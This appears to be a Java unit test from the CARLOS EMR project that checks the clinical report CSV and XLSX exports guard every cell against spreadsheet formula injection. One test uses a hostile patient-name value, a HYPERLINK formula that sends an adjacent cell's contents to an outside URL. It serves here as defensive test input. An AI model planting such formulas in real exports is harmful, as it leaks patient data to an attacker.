/* Copyright (c) 2026 CARLOS Contributors. GPL-2.0-or-later. */
package io.github.carlos_emr.carlos.report.ClinicalReports.PageUtil;

import static org.assertj.core.api.Assertions.assertThat;

import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.ObjectMapper;
import io.github.carlos_emr.carlos.utility.SpreadsheetCsv;
import java.io.StringReader;
import java.io.StringWriter;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import org.apache.commons.csv.CSVFormat;
import org.apache.commons.csv.CSVParser;
import org.apache.commons.csv.CSVPrinter;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Tag;
import org.junit.jupiter.api.Test;

/**
 * Pins the spreadsheet formula guard on the Clinical Reports CSV and XLSX downloads (issue #5846).
 *
 * <p>{@code ClinicalReports.jsp} builds the CSV that {@code ClinicalExport.jsp} serves as
 * {@code oscarReport.csv} and converts to {@code oscarReport.xlsx}. Its cells carry patient names,
 * addresses and measurement text, so each header and data cell must pass through
 * {@link SpreadsheetCsv#sanitizeCell(String)}, and the XLSX copy must show the original text
 * again rather than the guard tab.</p>
 *
 * @since 2026-11-26
 */
@Tag("unit")
@Tag("fast")
@Tag("security")
class ClinicalReportsCsvFormulaGuardJspRegressionTest
        extends io.github.carlos_emr.carlos.test.unit.CarlosUnitTestBase {

    private static final Path REPORTS_JSP =
            Path.of("src", "main", "webapp", "WEB-INF", "jsp", "report", "ClinicalReports.jsp");
    private static final Path EXPORT_JSP =
            Path.of("src", "main", "webapp", "WEB-INF", "jsp", "report", "ClinicalExport.jsp");
    private static final Path FIXTURE =
            Path.of("scripts", "fixtures", "spreadsheet-csv-cell-cases.json");

    /** The first argument of each {@code csvp.print(} call, up to the end of its statement. */
    private static final Pattern PRINT_CALL = Pattern.compile("csvp\\.print\\((.*?)\\);", Pattern.DOTALL);

    @Test
    @DisplayName("should pass every CSV header and data cell through the shared formula guard")
    void shouldSanitizeEveryCsvCell_whenClinicalReportCsvIsBuilt() throws Exception {
        String jsp = Files.readString(REPORTS_JSP, StandardCharsets.UTF_8);

        assertThat(jsp).contains("io.github.carlos_emr.carlos.utility.SpreadsheetCsv");
        Matcher calls = PRINT_CALL.matcher(jsp);
        int found = 0;
        while (calls.find()) {
            found++;
            assertThat(calls.group(1).trim())
                    .as("csvp.print argument %d must be guarded", found)
                    .startsWith("SpreadsheetCsv.sanitizeCell(");
        }
        // two heading rows (demographic columns, output fields) and two data cells
        assertThat(found).as("csvp.print call sites").isEqualTo(4);
    }

    @Test
    @DisplayName("should use only the guarded printer for the CSV text")
    void shouldNotPrintCsvCellsAnyOtherWay_whenClinicalReportCsvIsBuilt() throws Exception {
        String jsp = Files.readString(REPORTS_JSP, StandardCharsets.UTF_8);

        assertThat(jsp).doesNotContain("printRecord(").doesNotContain("printRecords(");
        assertThat(jsp.split("new CSVPrinter\\(", -1)).as("one CSV printer").hasSize(2);
    }

    @Test
    @DisplayName("should drop only the guard tab when the XLSX copy is built from the CSV")
    void shouldDropGuardTab_whenXlsxIsBuiltFromCsv() throws Exception {
        String jsp = Files.readString(EXPORT_JSP, StandardCharsets.UTF_8);

        assertThat(jsp).contains("cell.startsWith(\"\\t\") ? cell.substring(1) : cell");
    }

    @Test
    @DisplayName("should restore the original text of every guarded cell after the CSV round trip")
    void shouldRestoreOriginalText_afterCsvRoundTripAndGuardTabDrop() throws Exception {
        JsonNode cases = new ObjectMapper()
                .readTree(Files.readString(FIXTURE, StandardCharsets.UTF_8)).get("cases");
        assertThat(cases.size()).isPositive();

        for (JsonNode testCase : cases) {
            String original = testCase.get("input").asText();
            String csv = writeLikeClinicalReports(original);

            String guarded = parseSingleCell(csv);
            // ClinicalExport.jsp: drop exactly one leading tab
            String restored = guarded.startsWith("\t") ? guarded.substring(1) : guarded;

            assertThat(guarded).as("CSV cell for %s", original).isEqualTo(testCase.get("expected").asText());
            if (guarded.startsWith("\t")) {
                // a guarded cell must come back as the text the patient record holds
                assertThat(restored).as("XLSX cell for %s", original).isEqualTo(original);
            } else {
                assertThat(restored).as("unguarded cell for %s", original).isEqualTo(original);
            }
        }
    }

    @Test
    @DisplayName("should keep a hostile patient name inert in the CSV text")
    void shouldGuardHostileName_whenWrittenAsCsv() throws Exception {
        String csv = writeLikeClinicalReports("=HYPERLINK(\"https://x/?\"&B2,\"click\")");

        List<String> cells = parseRow(csv);
        assertThat(cells).hasSize(1);
        assertThat(cells.get(0)).startsWith("\t=HYPERLINK(");
    }

    private static String writeLikeClinicalReports(String cell) throws Exception {
        StringWriter out = new StringWriter();
        try (CSVPrinter printer = new CSVPrinter(out, CSVFormat.DEFAULT)) {
            printer.print(SpreadsheetCsv.sanitizeCell(cell));
            printer.println();
        }
        return out.toString();
    }

    private static String parseSingleCell(String csv) throws Exception {
        return parseRow(csv).get(0);
    }

    private static List<String> parseRow(String csv) throws Exception {
        try (CSVParser parser = CSVParser.parse(new StringReader(csv), CSVFormat.DEFAULT)) {
            List<org.apache.commons.csv.CSVRecord> records = parser.getRecords();
            // an empty cell is a blank line, which the parser skips
            return records.isEmpty() ? List.of("") : records.get(0).toList();
        }
    }
}
